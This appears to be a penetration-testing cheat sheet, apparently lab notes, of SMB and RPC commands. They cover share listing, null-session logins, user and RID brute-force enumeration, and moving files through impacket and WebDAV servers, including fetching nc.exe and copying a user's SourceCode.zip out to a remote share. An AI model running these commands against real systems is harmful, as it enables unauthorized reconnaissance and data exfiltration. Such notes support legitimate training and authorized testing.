#### Shares
```shell
smbclient -L '\\<IP>'
```

```shell
smbclient -N '\\<IP>\<share>\'
```

```shell
smbclient -U <users> -L '\\<IP>\\<sharename>'
```

```shell
smbclient -U <user> '\\<IP>\\<sharename>'
```
#### Status
```shell
smbstatus
```
## SMB Downloads
#### Create the SMB Server
```shell
sudo impacket-smbserver share -smb2support /tmp/smbshare
```
#### Copy a File from the SMB Server
```cmd
copy \\192.168.220.133\share\nc.exe
```
#### Create the SMB Server with a Username and Password
```shell
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
```
#### Mount the SMB Server with Username and Password
```cmd
net use n: \\192.168.220.133\share /user:test test
```
```
copy \\192.168.220.133\share\nc.exe
```
## SMB Uploads
### WebDav
```shell
sudo pip3 install wsgidav cheroot
```
#### WebDav Python
```shell
sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous 
```
#### Webdav Share
```cmd
dir \\192.168.49.128\DavWWWRoot
```
#### Uploading Files using SMB
```cmd
copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\
```
```cmd
copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\
```
## RPCclient
```shell
rpcclient -U "" 10.129.14.128
```
#### Enumeration
```rpc
srvinfo

enumdomains

querydominfo

netshareenumall

netsharegetinfo notes
```
#### User Enumeration
```shell
enumdomusers

queryuser <user>
```
#### Group Information
```shell
querygroup <group>
```
#### Brute Forcing User RIDs
```shell
for i in $(seq 500 1100);do rpcclient -N -U "" 10.129.14.128 -c "queryuser 0x$(printf '%x\n' $i)" | grep "User Name\|user_rid\|group_rid" && echo "";done
```
#### Impacket - Samrdump.py
```shell
samrdump.py 10.129.14.128
```
#### SMBmap
```shell
smbmap -H <IP>
```
#### CrackMapExec
```shell
crackmapexec smb 10.129.14.128 --shares -u '' -p ''
```
#### Enum4Linux
```
enum4linux <IP> -A
```
